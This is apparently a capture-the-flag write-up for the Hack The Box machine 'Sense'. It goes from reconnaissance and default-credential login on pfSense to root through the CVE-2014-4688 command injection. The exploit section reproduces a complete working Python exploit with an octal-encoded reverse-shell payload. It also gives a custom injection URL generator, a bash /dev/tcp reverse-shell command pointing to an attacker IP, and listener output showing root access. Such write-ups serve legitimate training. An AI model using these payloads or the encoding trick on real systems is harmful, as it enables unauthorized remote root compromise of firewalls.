### Summary
We begin this box on a `pfSense` login page. After extensive subdirectory brute-forcing, we come across default credentials in the form of `user-system.txt`. We use those credentials to gain access to the web portal which shows `pfSense` version `2.1.3` which is vulnerable to command injection. From there, we successfully spawn a `python` reverse shell and gain root access to the box.

### Tools
- `feroxbuster`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80/443]]
###### [[#Root Shell]]
- [[#pfSense Enumeration]]
- [[#CVE-2014-4688]]
	- [[#poc.py]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.48.97 -oN nmap/tcp             
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```
```sh
❯ sudo nmap -p 80,443 -sCV -vv 10.129.48.97 -oN nmap/tcpScripts
80/tcp  open  http       syn-ack ttl 63 lighttpd 1.4.35
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.48.97/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/https? syn-ack ttl 63
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/localityName=Somecity/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/localityName=Somecity/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-14T19:21:35
| Not valid after:  2023-04-06T19:21:35
| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622
| SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02
| -----BEGIN CERTIFICATE-----
| MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD
| VQQGEwJVUzESMBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEU
| MBIGA1UEChMLQ29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVu
| aXQgTmFtZSAoZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcs
| IFlPVVIgbmFtZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3MwHhcNMTcx
| MDE0MTkyMTM1WhcNMjMwNDA2MTkyMTM1WjCBvzELMAkGA1UEBhMCVVMxEjAQBgNV
| BAgTCVNvbWV3aGVyZTERMA8GA1UEBxMIU29tZWNpdHkxFDASBgNVBAoTC0NvbXBh
| bnlOYW1lMS8wLQYDVQQLEyZPcmdhbml6YXRpb25hbCBVbml0IE5hbWUgKGVnLCBz
| ZWN0aW9uKTEkMCIGA1UEAxMbQ29tbW9uIE5hbWUgKGVnLCBZT1VSIG5hbWUpMRww
| GgYJKoZIhvcNAQkBFg1FbWFpbCBBZGRyZXNzMIGfMA0GCSqGSIb3DQEBAQUAA4GN
| ADCBiQKBgQC/sWU6By08lGbvttAfx47SWksgA7FavNrEoW9IRp0W/RF9Fp5BQesL
| L3FMJ0MHyGcfRhnL5VwDCL0E+1Y05az8PY8kUmjvxSvxQCLn6Mh3nTZkiAJ8vpB0
| WAnjltrTCEsv7Dnz2OofkpqaUnoNGfO3uKWPvRXl9OlSe/BcDStffQIDAQABo4IB
| KDCCASQwHQYDVR0OBBYEFDK5DS/hTsi9SHxT749Od/p3Lq05MIH0BgNVHSMEgeww
| gemAFDK5DS/hTsi9SHxT749Od/p3Lq05oYHFpIHCMIG/MQswCQYDVQQGEwJVUzES
| MBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEUMBIGA1UEChML
| Q29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVuaXQgTmFtZSAo
| ZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcsIFlPVVIgbmFt
| ZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3OCCQCwoWiKYsM+NTAMBgNV
| HRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBAHNn+1AX2qwJ9zhgN3I4ES1Vq84l
| n6p7OoBefxcf31Pn3VDnbvJJFFcZdplDxbIWh5lyjpTHRJQyHECtEMW677rFXJAl
| /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI
| +Y0tZRIRzHWgQHa/
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
```
- Looks like we've got an `HTTPS` webserver running on the host
- The TTL is indicative of a posix adherent system 

## Web - TCP 80/443
---
- When we navigate to `https://10.129.48.97`, we see a login page for [`pfSense`](https://www.pfsense.org/), a firewall/router computer software distribution based on FreeBSD
- We can check the `TLS` certificate to see that it's default information, nothing interesting present:
![[Pasted image 20251228223631.png]]

- We can enumerate subdomains with `feroxbuster`:
```sh
❯ feroxbuster -u "https://10.129.48.97" -x html,php,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-1.0.txt --insecure

https://10.129.48.97/index.php
https://10.129.48.97/help.php
https://10.129.48.97/themes/
https://10.129.48.97/exec.php
https://10.129.48.97/edit.php
https://10.129.48.97/stats.php

200      GET      173l      425w     6690c https://10.129.48.97/
...
```
- When we start to investigate many of these subdomains, they redirect back to the login page, and they indicate `425` words and a size of `6690`
- We also need to use the right wordlist :))))
```sh
❯ feroxbuster -u "https://10.129.48.97" -x html,php,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt --insecure --filter-words 425 -n 

https://10.129.48.97/fred.png
https://10.129.48.97/themes
https://10.129.48.97/fred.png
https://10.129.48.97/css
https://10.129.48.97/includes
https://10.129.48.97/javascript
https://10.129.48.97/changelog.txt
https://10.129.48.97/classes
https://10.129.48.97/index.html
https://10.129.48.97/widgets
https://10.129.48.97/tree
https://10.129.48.97/shortcuts
https://10.129.48.97/installer
https://10.129.48.97/wizards
https://10.129.48.97/xmlrpc.php
https://10.129.48.97/csrf
https://10.129.48.97/system-users.txt
https://10.129.48.97/filebrowser
```
- The most interesting item here is `system-users.txt`:
```text
####Support ticket###

Please create the following user

username: Rohit
password: company defaults
```
- Looking up the [default credentials for pfSense](https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html) we get `admin:pfsense`
- When we try to log into the portal with `rohot:pfsense`, we get in

# Root Shell
## pfSense Enumeration
---
- We can see in system information that we're working with pfSense `2.1.3-RELEASE`
- We can take a look on `searchsploit` for any known vulnerabilities:
```sh
❯ searchsploit pfsense
...
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection | php/webapps/43560.py
...
❯ searchsploit -m 43560     
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /opt/exploitdb/exploits/php/webapps/43560.py
    Codes: CVE-2014-4688
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/aldamd/ctf/htb/Sense - 10.129.48.97/43560.py
```
- Supposedly, there's a command injection vulnerability in the `status_rrd_graph.php` page which is resolvable in the current web application 

## CVE-2014-4688
---
### poc.py
```python
#!/usr/bin/env python3

# Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
# Date: 2018-01-12
# Exploit Author: absolomb
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/
# Version: <=2.1.3
# Tested on: FreeBSD 8.3-RELEASE-p16
# CVE : CVE-2014-4688

import argparse
import requests
import urllib
import urllib3
import collections

'''
pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
This script will return a reverse shell on specified listener address and port.
Ensure you have started a listener to catch the shell before running!
'''

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument('--lhost', help = 'Local Host listener')
parser.add_argument('--lport', help = 'Local Port listener')
parser.add_argument("--username", help = "pfsense Username")
parser.add_argument("--password", help = "pfsense Password")
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password

# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)

payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]

# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)

# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

client = requests.session()

# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)
	
	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]

except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)
else:
	print("No CSRF token!")
	exit()

if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
			if exploit_request.status_code:
				print("Error running exploit")
		except:
			print("Exploit completed")
```
- This script encodes a python websocket reverse shell payload in octal notation and then passes it to `"https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"`
- By running `printf` on an octal payload, it's converted back to string, this is likely to bypass the WAF
- It does some more logic to automate obtaining a valid login and subsequent `csrf` token for session keeping, but we can simplify this process by bastardizing a command generation script:
```python
#!/usr/bin/env python3

import sys

rhost = "10.129.48.97"
payload = ""

# encode payload in octal
for char in sys.argv[1]:
    payload += "\\" + oct(ord(char)).lstrip("0o")

login_url = "https://" + rhost + "/index.php"
exploit_url = (
    "https://"
    + rhost
    + "/status_rrd_graph_img.php?database=queues;"
    + "printf+"
    + "'"
    + payload
    + "'|sh"
)
print(exploit_url)
```
```sh
❯ ./test.py "ping -c1 10.10.14.50" 
https://10.129.48.97/status_rrd_graph_img.php?database=queues;printf+'\160\151\156\147\40\55\143\61\40\61\60\56\61\60\56\61\64\56\65\60'|sh
```
- When we visit this url with `tcpdump` active, we see we get a ping, meaning successful RCE!
```sh
❯ sudo tcpdump -i tun0 icmp 
00:00:36.645821 IP 10.129.48.97 > fedora-laptop: ICMP echo request, id 49482, seq 0, length 64
00:00:36.645897 IP fedora-laptop > 10.129.48.97: ICMP echo reply, id 49482, seq 0, length 64
```

- We can generate a command to provide a bash reverse shell like so:
```sh
❯ ./test.py "bash -c 'bash -i &> /dev/tcp/10.10.14.50/12345 0>&1'"
https://10.129.48.97/status_rrd_graph_img.php?database=queues;printf+'\142\141\163\150\40\55\143\40\47\142\141\163\150\40\55\151\40\46\76\40\57\144\145\166\57\164\143\160\57\61\60\56\61\60\56\61\64\56\65\60\57\61\62\63\64\65\40\60\76\46\61\47'|sh
```
- but it fails, along with specifying `/bin/bash`
- We can use the python payload that was originally in the POC and it works!
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.48.97.
Ncat: Connection from 10.129.48.97:37462.
sh: can\'t access tty; job control turned off
# whoami
root
# cat /home/rohit/user.txt
8721327cc232073b40d27d9c17e7348b          
# cat /root/root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
```

